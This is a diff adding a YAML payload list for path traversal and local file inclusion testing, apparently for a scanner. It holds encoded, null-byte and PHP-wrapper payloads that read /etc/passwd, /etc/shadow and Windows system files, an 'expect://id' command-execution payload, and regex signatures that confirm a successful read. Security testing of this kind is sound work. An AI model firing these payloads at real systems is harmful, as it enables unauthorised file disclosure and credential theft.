@@ -1,0 +1,41 @@
+# Path traversal / LFI payloads
+
+payloads:
+  unix:
+    - "../../../../etc/passwd"
+    - "../../../etc/passwd"
+    - "../../etc/passwd"
+    - "/etc/passwd"
+    - "/etc/shadow"
+    - "....//....//....//etc/passwd"
+    - "..%2f..%2f..%2fetc%2fpasswd"
+    - "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    - "..%252f..%252f..%252fetc%252fpasswd"  # double URL encode
+    - "....\/....\/etc/passwd"
+
+  windows:
+    - "..\\..\\..\\windows\\win.ini"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+    - "C:\\windows\\win.ini"
+    - "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini"
+    - "..%5c..%5c..%5cwindows%5cwin.ini"
+
+  null_byte:
+    - "../../../../etc/passwd%00"
+    - "../../../../etc/passwd\x00"
+    - "../../../../etc/passwd%00.jpg"
+
+  wrappers:
+    - "php://filter/read=convert.base64-encode/resource=/etc/passwd"
+    - "php://filter/convert.base64-encode/resource=index.php"
+    - "data://text/plain;base64,SSBsb3ZlIFBIUAo="
+    - "expect://id"
+
+# Detection signatures
+match_signatures:
+  - "root:.*:0:0:"      # /etc/passwd
+  - "\\[fonts\\]"       # windows/win.ini
+  - "\\[boot loader\\]"
+  - "\\[extensions\\]"
+  - "daemon:.*:/bin"
+  - "bin:.*:/bin"
